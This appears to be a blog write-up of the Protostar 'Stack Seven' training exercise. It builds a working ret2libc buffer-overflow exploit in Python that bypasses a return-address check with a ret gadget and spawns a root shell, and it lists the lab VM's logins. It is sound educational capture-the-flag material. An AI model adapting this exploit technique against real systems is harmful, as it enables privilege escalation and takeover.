<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>pwncone.io</title>
    <link rel="stylesheet" href="../../../../css/style.css">
  </head>

<body>

<section>

    <writeup>
        <h1><strong>#Protostar - Stack Seven</strong></h1>
        <a href="https://exploit.education/protostar/stack-seven/">https://exploit.education/protostar/stack-seven/</a><br>
        <strong>NOTE</strong>: I'm exploiting stack7 on the protostar VM, not on my attacking system<br>
        <br>
        <img alt="images\11-1.png" src="images/11-1.png"><br>
        <br>
        In this challenge, the return address is massively restricted.<br>
        <code>if((ret &amp; 0xb0000000) == 0xb0000000)</code> is preventing us from returning to anywhere on the stack and libc.<br>
        <br>
        Instead, as the challenge description mentions, we have to return to the <code>.text</code> section of memory.<br>
        <code>.text</code> is where program instructions lie.<br>
        <br>
        <strong>How to solve this challenge?</strong><br>
        To solve this challenge, we first return to a <code>ret</code> inside the <code>.text</code> section memory to bypass the return address restriction, and then use the <code>ret</code> we returned to to jump to shellcode on the stack or, in my case, jump to system() in libc.<br>
        <br>
        We're only returning to the first <code>ret</code> instruction so that we can bypass the return address instruction. After that, we can return to any address we want (like libc).<br>
        <br>
        For this exploit, you'll need:<br>
        • the offset to EIP<br>
        • the address of a ret instruction<br>
        • address of system() in libc<br>
        • address of exit() in libc<br>
        • address of a /bin/sh string in libc<br>
        <br>
        First things first, find the offset to EIP to overflow the buffer.<br>
        <br>
        <a id="h2-1" name="h2-1"></a><strong></strong>
        <h2><strong>1) Find offset to EIP</strong></h2><br>
        SSH into your protostar VM with the credentials <code>user / user</code> (or just access it locally), and open the stack7 binary in gdb.<br>
            <div class="codebox">
                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>exploit-education<span style="color:#ff9d00;font-weight:700">/</span>protostar]<br>
                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#ssh&nbsp;user@192.168.1.72</span><br>
                <br>
                <br>
                &nbsp;&nbsp;&nbsp;&nbsp;PPPP&nbsp;&nbsp;RRRR&nbsp;&nbsp;&nbsp;OOO&nbsp;&nbsp;TTTTT&nbsp;&nbsp;OOO&nbsp;&nbsp;&nbsp;SSSS&nbsp;TTTTT&nbsp;&nbsp;&nbsp;A&nbsp;&nbsp;&nbsp;RRRR&nbsp;&nbsp;<br>
                &nbsp;&nbsp;&nbsp;&nbsp;P&nbsp;&nbsp;&nbsp;P&nbsp;R&nbsp;&nbsp;&nbsp;R&nbsp;O&nbsp;&nbsp;&nbsp;O&nbsp;&nbsp;&nbsp;T&nbsp;&nbsp;&nbsp;O&nbsp;&nbsp;&nbsp;O&nbsp;S&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;T&nbsp;&nbsp;&nbsp;&nbsp;A&nbsp;A&nbsp;&nbsp;R&nbsp;&nbsp;&nbsp;R&nbsp;<br>
                &nbsp;&nbsp;&nbsp;&nbsp;PPPP&nbsp;&nbsp;RRRR&nbsp;&nbsp;O&nbsp;&nbsp;&nbsp;O&nbsp;&nbsp;&nbsp;T&nbsp;&nbsp;&nbsp;O&nbsp;&nbsp;&nbsp;O&nbsp;&nbsp;SSS&nbsp;&nbsp;&nbsp;&nbsp;T&nbsp;&nbsp;&nbsp;AAAAA&nbsp;RRRR&nbsp;&nbsp;<br>
                &nbsp;&nbsp;&nbsp;&nbsp;P&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;R&nbsp;&nbsp;R&nbsp;&nbsp;O&nbsp;&nbsp;&nbsp;O&nbsp;&nbsp;&nbsp;T&nbsp;&nbsp;&nbsp;O&nbsp;&nbsp;&nbsp;O&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;S&nbsp;&nbsp;&nbsp;T&nbsp;&nbsp;&nbsp;A&nbsp;&nbsp;&nbsp;A&nbsp;R&nbsp;&nbsp;R&nbsp;&nbsp;<br>
                &nbsp;&nbsp;&nbsp;&nbsp;P&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;R&nbsp;&nbsp;&nbsp;R&nbsp;&nbsp;OOO&nbsp;&nbsp;&nbsp;&nbsp;T&nbsp;&nbsp;&nbsp;&nbsp;OOO&nbsp;&nbsp;SSSS&nbsp;&nbsp;&nbsp;&nbsp;T&nbsp;&nbsp;&nbsp;A&nbsp;&nbsp;&nbsp;A&nbsp;R&nbsp;&nbsp;&nbsp;R&nbsp;<br>
                <br>
                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>exploit-exercises.com<span style="color:#ff9d00;font-weight:700">/</span>protostar&nbsp;&nbsp;&nbsp;&nbsp;<br>
                <br>
                Welcome&nbsp;to&nbsp;Protostar.&nbsp;To&nbsp;log&nbsp;in,&nbsp;you&nbsp;may&nbsp;use&nbsp;the&nbsp;user&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;user&nbsp;account.<br>
                When&nbsp;you&nbsp;need&nbsp;to&nbsp;use&nbsp;the&nbsp;root&nbsp;account,&nbsp;you&nbsp;can&nbsp;<span style="color:#ff9d00;font-weight:700">login</span>&nbsp;as&nbsp;root&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;godmode.<br>
                [...]<br>
                $&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>protostar<span style="color:#ff9d00;font-weight:700">/</span>bin<br>
                $&nbsp;gdb&nbsp;-q&nbsp;stack7<br>
                Reading&nbsp;symbols&nbsp;from&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>protostar<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>stack7...done.<br>
                <span style="color:#ff9d00;font-weight:700">(</span>gdb<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;
            </div>
        </div><br>
        <br>
        On your attacking machine, generate a cyclic pattern using <code>msf-pattern_create</code>.<br>
        On Kali this is located at <code>/usr/share/metasploit-framework/tools/pattern_create.rb</code><br>
            <div class="codebox">
                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>exploit-education<span style="color:#ff9d00;font-weight:700">/</span>protostar]<br>
                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#msf-pattern_create&nbsp;-l&nbsp;100</span><br>
                Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
            </div>
        </div><br>
        <br>
        Back in gdb, run the binary and submit the cyclic pattern.<br>
        The binary should crash.<br>
            <div class="codebox">
                <span style="color:#ff9d00;font-weight:700">(</span>gdb<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;run<br>
                Starting&nbsp;program<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>protostar<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>stack7&nbsp;<br>
                input&nbsp;path&nbsp;please<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A<br>
                got&nbsp;path&nbsp;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A<br>
                <br>
                Program&nbsp;received&nbsp;signal&nbsp;SIGSEGV,&nbsp;Segmentation&nbsp;fault.<br>
                0x37634136&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;??&nbsp;<span style="color:#ff9d00;font-weight:700">()</span>
            </div>
        </div><br>
        <br>
        The stack has been overflowed and EIP has been overwritten with <code>0x37634136</code>, which is part of our cyclic pattern.<br>
        <br>
        Submit the contents of EIP to <code>msf-pattern_offset</code>.<br>
        This will tell us the offset at which EIP gets overwritten.<br>
            <div class="codebox">
                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>exploit-education<span style="color:#ff9d00;font-weight:700">/</span>protostar]<br>
                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#msf-pattern_offset&nbsp;-q&nbsp;0x37634136&nbsp;</span><br>
                [*]&nbsp;Exact&nbsp;match&nbsp;at&nbsp;offset&nbsp;80
            </div>
        </div><br>
        <br>
        Great!<br>
        The offset to overwrite EIP is <code>80</code>,<br>
        which means that we need to write 80 bytes of junk to overflow the buffer.<br>
        <br>
        <a id="h2-2" name="h2-2"></a><strong></strong>
        <h2><strong>2) Find ret instruction</strong></h2><br>
        Next, we need to find a <code>ret</code> instruction within the binary.<br>
        <br>
        Use objdump to print the binary's assembly instructions, and grep for a <code>ret</code> instruction.<br>
            <div class="codebox">
                $&nbsp;objdump&nbsp;-M&nbsp;intel&nbsp;-d&nbsp;stack7&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">grep</span>&nbsp;ret<br>
                &nbsp;8048383<span style="color:#ff9d00;font-weight:700">:</span> c3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ret&nbsp;&nbsp;&nbsp;&nbsp;<br>
                &nbsp;8048494<span style="color:#ff9d00;font-weight:700">:</span> c3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ret&nbsp;&nbsp;&nbsp;&nbsp;<br>
                &nbsp;80484c2<span style="color:#ff9d00;font-weight:700">:</span> c3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ret&nbsp;&nbsp;&nbsp;&nbsp;<br>
                &nbsp;8048544<span style="color:#ff9d00;font-weight:700">:</span> c3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ret&nbsp;&nbsp;&nbsp;&nbsp;<br>
                &nbsp;8048553<span style="color:#ff9d00;font-weight:700">:</span> c3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ret&nbsp;&nbsp;&nbsp;&nbsp;<br>
                [...]
            </div>
        </div><br>
        <br>
        There's lots to choose from, and they're all outside the <code>0xb0</code> restricted memory range.<br>
        I used the first <code>ret</code> instruction, located at <code>0x8048383</code>.<br>
        <br>
        <a id="h2-3" name="h2-3"></a><strong></strong>
        <h2><strong>3) Find ret2libc values</strong></h2><br>
        For a more comprehensive write-up of ret2libc, you can refer to my stack6 write-up if you like.<br>
        <br>
        Open stack7 in gdb, set a breakpoint on main, and run the binary.<br>
        It should pause.<br>
            <div class="codebox">
                $&nbsp;gdb&nbsp;-q&nbsp;stack7<br>
                Reading&nbsp;symbols&nbsp;from&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>protostar<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>stack7...done.<br>
                <span style="color:#ff9d00;font-weight:700">(</span>gdb<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">break</span>&nbsp;main<br>
                Breakpoint&nbsp;1&nbsp;at&nbsp;0x804854b<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">file</span>&nbsp;stack7<span style="color:#ff9d00;font-weight:700">/</span>stack7.c,&nbsp;line&nbsp;28.<br>
                <span style="color:#ff9d00;font-weight:700">(</span>gdb<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;run<br>
                Starting&nbsp;program<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>protostar<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>stack7&nbsp;<br>
                ri<br>
                Breakpoint&nbsp;1,&nbsp;main&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>argc=1,&nbsp;argv=0xbffffd64<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;at&nbsp;stack7<span style="color:#ff9d00;font-weight:700">/</span>stack7.c<span style="color:#ff9d00;font-weight:700">:</span>28<br>
                28 stack7<span style="color:#ff9d00;font-weight:700">/</span>stack7.c<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;No&nbsp;such&nbsp;<span style="color:#ff9d00;font-weight:700">file</span>&nbsp;or&nbsp;directory.<br>
                <span style="color:#ff9d00;font-weight:700">in</span>&nbsp;stack7<span style="color:#ff9d00;font-weight:700">/</span>stack7.c<br>
                <span style="color:#ff9d00;font-weight:700">(</span>gdb<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;
            </div>
        </div><br>
        <br>
        <a id="h3-1" name="h3-1"></a><strong></strong>
        <h3><strong>3a) system() and exit()</strong></h3><br>
        Use <code>print &lt;function&gt;</code> to print the address of functions in libc.<br>
            <div class="codebox">
                <span style="color:#ff9d00;font-weight:700">(</span>gdb<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;print&nbsp;system<br>
                <span style="color:#7f0044;font-weight:400">$1</span>&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">{</span>&lt;text&nbsp;variable,&nbsp;no&nbsp;debug&nbsp;<span style="color:#ff9d00;font-weight:700">info</span>&gt;<span style="color:#ff9d00;font-weight:700">}</span>&nbsp;0xb7ecffb0&nbsp;&lt;__libc_system&gt;<br>
                <span style="color:#ff9d00;font-weight:700">(</span>gdb<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;print&nbsp;<span style="color:#ff9d00;font-weight:700">exit</span><br>
                <span style="color:#7f0044;font-weight:400">$2</span>&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">{</span>&lt;text&nbsp;variable,&nbsp;no&nbsp;debug&nbsp;<span style="color:#ff9d00;font-weight:700">info</span>&gt;<span style="color:#ff9d00;font-weight:700">}</span>&nbsp;0xb7ec60c0&nbsp;&lt;*__GI_exit&gt;
            </div>
        </div><br>
        <br>
        system() is located at <code>0xb7ecffb0</code><br>
        exit() is located at <code>0xb7ec60c0</code><br>
        <br>
        <a id="h3-2" name="h3-2"></a><strong></strong>
        <h3><strong>3b) /bin/sh address</strong></h3><br>
        Run <code>info proc mappings</code> to find the base address of libc (the first instance of libc being loaded at offset 0)<br>
            <div class="codebox">
                <span style="color:#ff9d00;font-weight:700">(</span>gdb<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">info</span>&nbsp;proc&nbsp;mappings<br>
                process&nbsp;4069<br>
                cmdline&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'/opt/protostar/bin/stack7'</span><br>
                cwd&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'/opt/protostar/bin'</span><br>
                exe&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'/opt/protostar/bin/stack7'</span><br>
                Mapped&nbsp;address&nbsp;spaces<span style="color:#ff9d00;font-weight:700">:</span><br>
                <br>
                Start&nbsp;Addr&nbsp;&nbsp;&nbsp;End&nbsp;Addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Size&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Offset&nbsp;objfile<br>
                &nbsp;0x8048000&nbsp;&nbsp;0x8049000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x1000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>protostar<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>stack7<br>
                &nbsp;0x8049000&nbsp;&nbsp;0x804a000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x1000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>protostar<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>stack7<br>
                0xb7e96000&nbsp;0xb7e97000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x1000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
                0xb7e97000&nbsp;0xb7fd5000&nbsp;&nbsp;&nbsp;0x13e000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>lib<span style="color:#ff9d00;font-weight:700">/</span>libc-2.11.2.so<br>
                0xb7fd5000&nbsp;0xb7fd6000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x1000&nbsp;&nbsp;&nbsp;0x13e000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>lib<span style="color:#ff9d00;font-weight:700">/</span>libc-2.11.2.so<br>
                0xb7fd6000&nbsp;0xb7fd8000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x2000&nbsp;&nbsp;&nbsp;0x13e000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>lib<span style="color:#ff9d00;font-weight:700">/</span>libc-2.11.2.so<br>
                0xb7fd8000&nbsp;0xb7fd9000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x1000&nbsp;&nbsp;&nbsp;0x140000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>lib<span style="color:#ff9d00;font-weight:700">/</span>libc-2.11.2.so<br>
                [...]
            </div>
        </div><br>
        <br>
        Libc's base address is <code>0xb7e96000</code>.<br>
        <br>
        Run <code>strings -a -t x /lib/libc-2.11.2.so | grep /bin/sh</code> to search libc for the offset to a /bin/sh string.<br>
            <div class="codebox">
                $&nbsp;strings&nbsp;-a&nbsp;-t&nbsp;x&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>lib<span style="color:#ff9d00;font-weight:700">/</span>libc-2.11.2.so&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">grep</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/sh</span><br>
                &nbsp;11f3bf&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/sh</span>
            </div>
        </div><br>
        <br>
        The offset to a /bin/sh string in libc is <code>0x11f3bf</code>.<br>
        If we add libc's base address and the /bin/sh offset, we will have the absolute address of /bin/sh in libc. We'll do this addition in our exploit.<br>
        <br>
        <a id="h2-4" name="h2-4"></a><strong></strong>
        <h2><strong>4) Write exploit</strong></h2><br>
        At this point, we have everything we need to write our exploit.<br>
        <br>
        <a id="h3-3" name="h3-3"></a><strong></strong>
        <h3><strong>Overview</strong></h3><br>
        • A ret instruction is located at <code>0x8048383</code><br>
        • system() is located at <code>0xb7ecffb0</code><br>
        • exit() is located at <code>0xb7ec60c0</code><br>
        • /bin/sh is located at <code>0xb7e97000</code> + <code>0x11f3bf</code><br>
        <br>
        We use <code>struct.pack('&lt;I'</code>, to pack the memory addresses in 32-bit little endian format.<br>
        <br>
        <a id="h3-4" name="h3-4"></a><strong></strong>
        <h3><strong>Payload Structure</strong></h3><br>
        First return to the <code>ret</code> instruction, and afterwards you can return to whatever you like.<br>
        <br>
        Our attack structure looks like this:<br>
        - Fill buffer<br>
        - Overwrite EIP with address of <code>ret</code> instruction (bypassing return address restriction)<br>
        - Write system() address to the stack (so that <code>ret</code> can return to it)<br>
        - Write exit() address to the stack (so that system() exits cleanly)<br>
        - Write /bin/sh to the stack, the function parameter for system()<br>
        <br>
        <a id="h3-5" name="h3-5"></a><strong></strong>
        <h3><strong>Final Exploit Code</strong></h3><br>
        Here's my final exploit code:<br>
            <div class="codebox">
                <span style="color:#0088ff;font-weight:400">#!/usr/bin/python</span><br>
                <span style="color:#0088ff;font-weight:400">#&nbsp;exploit-education&nbsp;-&nbsp;Stack&nbsp;Seven</span><br>
                <br>
                <span style="color:#333333;font-weight:400">import</span>&nbsp;struct<br>
                <br>
                bufferSize&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">80</span><br>
                ret&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;I'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x8048383</span>)<br>
                <br>
                libc_base&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0xb7e97000</span><br>
                libc_binsh&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0x11f3bf</span><br>
                <br>
                libc_system_addr&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;I'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0xb7ecffb0</span>)<br>
                libc_exit_addr&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;I'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0xb7ec60c0</span>)<br>
                libc_binsh_addr&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;I'</span>,&nbsp;libc_base&nbsp;+&nbsp;libc_binsh)<br>
                <br>
                payload&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>*bufferSize&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;fill&nbsp;buffer</span><br>
                payload&nbsp;+=&nbsp;ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;return&nbsp;to&nbsp;0x8048383</span><br>
                payload&nbsp;+=&nbsp;libc_system_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;return&nbsp;to&nbsp;system()</span><br>
                payload&nbsp;+=&nbsp;libc_exit_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;return&nbsp;address&nbsp;when&nbsp;system()&nbsp;exits</span><br>
                payload&nbsp;+=&nbsp;libc_binsh_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;paramter&nbsp;for&nbsp;system()&nbsp;-&nbsp;"/bin/sh"&nbsp;string</span><br>
                <br>
                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;payload
            </div>
        </div><br>
        <br>
        <a id="h2-5" name="h2-5"></a><strong></strong>
        <h2><strong>4) Win</strong></h2><br>
        Because we're spawning a shell, we need to halt the program with <code>cat</code> so that we can interact with the spawned shell.<br>
        Otherwise, the shell would spawn but the binary would quit immediately.<br>
        <br>
            <div class="codebox">
                $&nbsp;(python&nbsp;/tmp/stack7.py;&nbsp;cat)&nbsp;|&nbsp;./stack7<br>
                <span style="color:#ff9d00;font-weight:700">input</span>&nbsp;path&nbsp;please:&nbsp;got&nbsp;path&nbsp;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�AAAAAAAAAAAA�����`췿c��<br>
                <span style="color:#ff9d00;font-weight:700">id</span><br>
                uid=<span style="color:#ff0044;font-weight:400">1001</span>(user)&nbsp;gid=<span style="color:#ff0044;font-weight:400">1001</span>(user)&nbsp;euid=<span style="color:#ff0044;font-weight:400">0</span>(root)&nbsp;groups=<span style="color:#ff0044;font-weight:400">0</span>(root),<span style="color:#ff0044;font-weight:400">1001</span>(user)<br>
                whoami<br>
                root
            </div>
        </div><br>
        <br>
        Success!<br>
        We've successfully bypassed the return address and returned to libc to spawn a shell :)<br>
    </writeup>
</section>

</body>
</html>